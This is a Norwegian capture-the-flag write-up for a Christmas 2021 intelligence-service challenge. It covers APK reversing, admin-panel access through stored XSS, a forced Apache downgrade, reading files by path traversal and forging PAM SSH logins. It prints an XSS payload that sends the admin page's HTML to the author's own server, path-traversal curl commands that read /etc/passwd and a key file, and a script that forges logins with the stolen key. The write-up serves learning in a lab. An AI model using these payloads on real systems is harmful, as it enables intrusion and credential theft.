---
title: Etjenesten21 - Oppdrag
date: 2022-01-17 13:00:00 +0100
categories: [Etjenesten, Etjenesten Jul 21]
tags: [ctf, etjenesten, rev, pwn, python, javascript, "2021", apk, csrf, xss, jwt, norwegian]
media_subpath: /assets/img/etjenesten21/
---
# 2.1_app
Vi f친r tildelt en *.apk* fil i lag med oppdragsteksten. Denne apk-filen kan vi unzippe for 친 f친 tilgang til filene som er brukt til 친 lage android appen. Inne blant filene finner vi to veldig interessante filer. Den ene filen er lokalisert i *assets* mappen, og er et tekstdokument some inneholder en url til en onion link. Den andre veldig interessant filen heter *classes2.dex*, og ved 친 reversere den med et tool som *jadx* finner vi f칮lgende informasjon:
```java
editor.putString("username", "user");
editor.putString("password", rot13("xxxxxxxx"));
```
Vi har funnet et brukernavn **user** med passordet **xxxxxxxx** (Legg merke til at passordet fra filen m친 tar rot13 med for 친 f친 passordet). Dette passordet er ogs친 2.1-flagget. Vi lagrer denne innlogginsinformasjonen til senere.

# 2.2_blog_1
Vi har f친tt i oppdragsteksten utdelt en link til en blogg med url-en *blog.utl*. Denne linken er bare mulig 친 bruke via terminalen inne p친 ctf-milj칮et, s친 vi pr칮ver 친 curl-e til denne siden. `curl "blog.utl"`. Responsen vi f친r tilbake vil redirecte oss til linken `blog.utl/auth/login`, s친 vi pr칮ver 친 bruke curl p친 den linken. `curl "blog.utl/auth/login"`. I meta-dataen til HTML-siden vi f친r tilbake ligger flagget.
`<meta name="FLAG_2.2" content="xxxxxxxx">`


# 2.3_blog_2
For flagg 3 m친 vi be칮ke onion linken vi fant da vi lette etter flagg 1. Siden det er en .onion link m친 vi g친 dit via browseren *tor*. Her f친r vi et innloggings-prompt hvor vi kan bruke innloggings-informasjonen til *user* som vi fant i *classes2.dex*.

Vi kommer inn p친 en blogg med diverse blogginnlegg. Ved 친 sjekke bloggens *robots.txt* finner vi f칮lgende informasjon:
```
/auth/login
/auth/register
/logs

/admin
/admin/update
```
De tre 칮verste har vi tilgang til som user, men vi har ikke admin-privilegier, s친 vi har ikke tilgang til de to nederste. */logs* inneholder informasjon om hva som er blitt gjort p친 nettstedet, men gjorde ikke noe spesielt mye nytte annet enn at man kunne se bevegelsene til admin som vi manipulerer snart.

*/auth/login* er hvor vi logget inn, og */auth/register* var en registreringsside for nye brukere, men registreringen var sl친tt av.

Etter mye leting og leking p친 nettsiden fant man ut at admin kommenterer p친 blogginnleggene man lager. I tillegg er XSS (Cross-site scripting) mulig 친 utf칮re p친 bloggen. Dette betyr at vi kan f친 kodesnutter til 친 kj칮re p친 maskinen til andre som laster inn bloggen, som i dette tilfellet er admin, siden han kommenterer p친 innleggene v친re. Vi kan dermed pr칮ve 친 f친 aksess til */admin*, som virker som er adminpanelet til siden.

Det var mye pr칮ving og feiling for 친 f친 dette til 친 fungere. Den endelige l칮sningen endte opp med 친 lage et blogginnlegg med javasciptkode som kj칮rer n친r admin laster inn siden. Scriptet f친r admin til 친 aksessere */admin* (adminpanelet), og n친r admin har kildekoden til */admin* nettsiden, f친 han til 친 sende en GET-request til en lokal python-server. HTML-koden blir sendt i url-en som han requester fra python-serveren, og vi har dermed kildekoden til adminpanelet (merk at HTML-koden er base64 enkodet n친r det ankommer serveren v친r, s친 dette 친 dekodes f칮rst).

Scriptet ble seende slik ut:
```python
import requests

s = requests.Session()
cookie = {"session": "eyJmbGFnIjoiMGEwZGZmZmRmYTdhN2U2ZDRhYzBhNGM1YWI0N2E1YjEiLCJ1c2VyX2lkIjoxNn0.Yb4jYQ.zIC4uLs8BbGY7jdKECjQHITekHk"}

script = """<script>
    xhr = new XMLHttpRequest();
    xhr.open("GET","/admin/");
    xhr.send();
    xhr.onload = function(){
         request = new XMLHttpRequest();
         request.open("GET", "http://<ip_addr_pythonserver>:<port>/"+encodeURI(xhr.responseText), true);
         request.send();
}    
</script>"""

blogpost = {"title": "Mission Plan", "body": script}
res = s.post("http://blog.utl/create", data=blogpost, cookies=cookie)
s.close()
```
I HTML-koden finner vi flagget `<h1> FLAG: xxxxxxxx </h1>`

# 2.4_webserver_1
I HTML-koden vi f친r fra admin finner vi f칮lgende interessante kodesnutt:
```html
<form action="/admin/update" method="post">
    <label for="service">Service:</label>
    <select name="service" class="selectpicker form-control">

      <option value="apache">anvilshop.utl ( apache )</option>

    </select>

    <label for="version">Version</label>
    <select name="version" class="selectpicker form-control">

        <option value="2.4.51">2.4.51</option>
        <option value="2.4.49">2.4.49</option>

    </select>
    <input class="btn" type="submit" value="Update">
  </form>
```
Det ser ut som om at admin kan endre apache-versjonen som nettsiden `anvilshop.utl` bruker. Dette er en nettside vi ogs친 fikk vite om i oppdragsteksten, og som bruker Apache 2.4.51. Apache 2.4.49 er kjent for 친 v칝re vulnerable for path-traversal attack og mulig RCE (Remote Code Execution), s친 dette er en versjon vi heller vil ha enn 2.4.51 (som ikke er vulnerable for disse angrepene).

Vi har fortsatt ikke tilgang selv til */admin/update*, men vi kan f친 admin til 친 endre versjonsnummeret til serveren for oss med samme XSS-exploit som flagg 3, bare med annen payload i selve scriptet.

Her trenger vi ikke noen kj칮rende server for 친 f친 responsen fra admin, ettersom vi kan se i HTML-koden at det bare sendes en POST-request til */admin/update* for 친 endre server-versjonen.

XSS-scriptet som fikk 칝ren av 친 utf칮re dette ble seende slik ut:
```python
import requests

s = requests.Session()
cookie = {"session": "eyJmbGFnIjoiMGEwZGZmZmRmYTdhN2U2ZDRhYzBhNGM1YWI0N2E1YjEiLCJ1c2VyX2lkIjoxNn0.Yb4jYQ.zIC4uLs8BbGY7jdKECjQHITekHk"}

script = """<script>
    xhr = new XMLHttpRequest();
    xhr.open("POST","/admin/update", true);
    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    xhr.send("service=apache&version=2.4.49");
</script>"""

blogpost = {"title": "Mission Plan", "body": script}
res = s.post("http://blog.utl/create", data=blogpost, cookies=cookie)
s.close()
```

Etter at vi har negradert versjonen til apache-serveren finner vi flagget i meta-tagen til responsen fra nettsiden. `curl "anvilshop.utl"` `<meta name="flag" content="xxxxxxxx">`


# 2.5_webserver_2
Vi har f친tt vite om et endpoint for anvilshop-nettstedet som brukes i denne oppgaven: `anvilshop.utl/cgi-bin/lootd.v2/download?app.apk`. Dette endpointet (cgi-bin) kan man ogs친 finne ved 친 se i *robots.txt* for nettstedet.

N친 som vi har nedgradert apache-versjonen kan vi pr칮ve 친 bruke path-traversal, og RCE. Etterhvert vil det vise seg at RCE ikke er mulig grunnet konfigueringen av apache-serveren (en cgi-modul som ikke brukes, som visstnok skal v칝re n칮dvending for RCE til 친 fungere). Path-traversal er derimot mulig, og vi kan f.eks ta en kikk p친 */etc/passwd* `curl "anvilshop.utl/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"`. Helt nederst i */etc/passwd* finner vi flagg 5.

Man kan finne flagg 5 p친 to andre m친ter i tillegg:
- `curl "anvilshop.utl/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/ssh/sshd_config"`
- `curl "anvilshop.utl/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/httpd.conf"`


# 2.9_pam
Denne oppgaven tok un칮dvendig lang tid. Jeg pr칮vde f칮rst 친 implementere koden under i C, men en liten feil i scriptet gjorde at det scriptet ikke funket. Det var derimot mye enklere 친 bruke javascript for 친 l칮se denne oppgaven.

Hvis man kj칮rer en nmap-scan p친 anvilshop vil man kunne se at i tillegg til at port 80 er 친pen (som er apache-serveren), s친 er port 22 ogs친 친pen (ssh-port).

Hvis man pr칮ver 친 logge seg inn p친 ssh-porten med brukeren user, `ssh user@anvilshop.utl` f친r man responsen `Challenge [t=<epoch_time>]:`(for eksempel kan epoch_time v칝re 1642362069). Dette var noe av det f칮rste jeg fant i oppdraget, men da hadde jeg ikke tilgang til "backend" s친 jeg kunne ikke se hvordan man skulle logge inn.

For 친 l칮se denne trenger man 친 finne sshd_config fila fra 2.5, som inneholder:
```
AuthenticationMethods keyboard-interactive:pam #/lib/security/pam_custom.so
ChallengeResponseAuthentication yes
PermitRootLogin no
UsePAM yes
PasswordAuthentication no
# FLAGG: xxxxxxxx
```
Her refereres det til PAM (som er en slags alternativ m친te 친 autentisere innlogginger p친, som et slags passord. Denne krever at man kjenner til passordet og krypteringsm친ten, og s친 er selve innloggingspassordet den krypterte versjonen).
Vi kan laste ned denne *pam_custom.so* fila, og reversere den med ghidra for 친 finne ut hvordan den fungerer, og hva den gj칮r.

N친r man reverserer fila finner man en del interessante funksjoner. Den mest interessante heter **get_expected_response**. Grunnen til at denne er interessant er fordi vi i en annen funksjon (challenge_response_authenticate) har denne koden:
```c
local_150 = time((time_t *)0x0);
iVar1 = snprintf((char *)&local_98,0x80,"Challenge [t=%zu]: ",local_150);
local_148 = SEXT48(iVar1);
if (local_148 < 0x80) {
  iVar1 = snprintf((char *)&local_118,0x80,"username=%s:timestamp=%zu",param_2,local_150);
  local_140 = SEXT48(iVar1);
  if (local_140 < 0x80) {
    iVar1 = get_expected_response(&local_118,local_140,&local_138,&local_160);
    if (iVar1 == 0) {
      iVar1 = perform_chall_resp_conv(param_1,&local_98,&local_158,&local_98);
      if (iVar1 == 0) {
        iVar1 = strcmp(*local_158,local_160);
        if (iVar1 == 0) {
          local_164 = 0;
        }
```

Det denne koden gj칮r er 친 hente epoch tiden (antall sekunder siden 1970), og putter det inn i strengen `"username=user:timestamp=<epoch_time>`"(username=user fordi vi pr칮ver 친 logge inn som "user"), og krypterer denne tekststrengen i *get_expected_response*. S친 sammenligner den den forventede responsen med det vi skriver inn som passord, og hvis vi skriver korrekt f친r vi logget inn til maskinen.

Hvis vi klarer 친 finne hva get_expected_response returnerer har vi passordet til brukeren for innloggingen (siden det brukes epoch-tid vil passordet v칝re annerledes hver gang).
Ghidra viser dette for funksjonen:

![pam](pam.png)

Det brukes et sodium bibliotek for krypteringen, som vi ogs친 har tilgang til i blant annet javascript. Vi ser ogs친 at det trengs en key som den henter fra */tmp/keyfile*, denne keyen kan vi hente ut med path-traversalen fra flagg 5. `curl "anvilshop.utl/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/keyfile"`. Vi kan da lage et script som lager passordet for oss (innholdet fra keyfile er skrevet direkte inn i sciptet):

```javascript
var sodium = require('sodium-native')
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});
readline.question('Time: ', time => {
  var nonce = Buffer.alloc(sodium.crypto_secretbox_NONCEBYTES)
  var message = Buffer.from(`username=user:timestamp=${time}`)
  var ciphertext = Buffer.alloc(message.length + 0x10)
  var key = Buffer.from("6047ed1d2246dd7223946e61a3b3ade031e7bfd44e3fb02cd9ea492484f711bb", "hex")

  sodium.crypto_secretbox_easy(ciphertext, message, nonce, key)
  console.log('Password:', ciphertext.toString('hex'))
  readline.close();
});
```


# 2.10_workstation
Inne p친 user-maskinen, i home-directoriet til user, ligger det et *.ssh* directory som er verdt 친 se i. Inni denne mappa ligger nemlig f칮lgende filer:
- authorized_keys
- config

F칮rstnevte er tom, men *config* inneholder informasjonen:
```
Host workstation
    Hostname workstation.anvilshop.utl
    User user
```
Det finnes alts친 en maskin til som user har aksess til. Vi pr칮ver 친 logge oss inn p친 denne maskinen `ssh user@workstation.anvilshop.utl`, og blir m칮tt med samme pam-innlogging som da vi fant flagg 9.

N친r vi er loggget inn p친 maskinen finner vi flagget i filen *FLAG* i home-directoriet til user.


# Skjulte Flagg

## 4.1_corax_dev_shm
Dette skjulte flagget l친 i `/dev/shm/` mappa i ei fil med navnet `.secret`.

## 4.2_blog_hidden_message
Dette flagget l친 i ett av blogginnleggene inne p친 bloggen. Ett innlegge hadde kapitalisering av bokstaver midt i setninger, og stavet ordet `ETTERRETNING`

## 4.3_jwt_hidden_flag
Dette flagget l친 ogs친 inne p친 bloggen. FLagget l친 i den base64-enkodet JWT-tokenen til brukeren man var innlogget som (JWT-token er kort forklart en type cookie).
```
JWT-token: eyJmbGFnIjoiMGEwZGZmZmRmYTdhN2U2ZDRhYzBhNGM1YWI0N2E1YjEiLCJ1c2VyX2lkIjoxNn0.Yb4jYQ.zIC4uLs8BbGY7jdKECjQHITekHk

{"flag":"0a0dfffdfa7a7e6d4ac0a4c5ab47a5b1","user_id":16}...
```

## 4.5_workstation_emacs_flag
Flagget l친 i home-directoriet til user, som man logget seg inn som. Selve flagget l친 i `~/.emacs.d/` i filen `init.el`.
`(defvar *noise* "ETJ{GNU TULLER DU VEL?\!游돗}")`
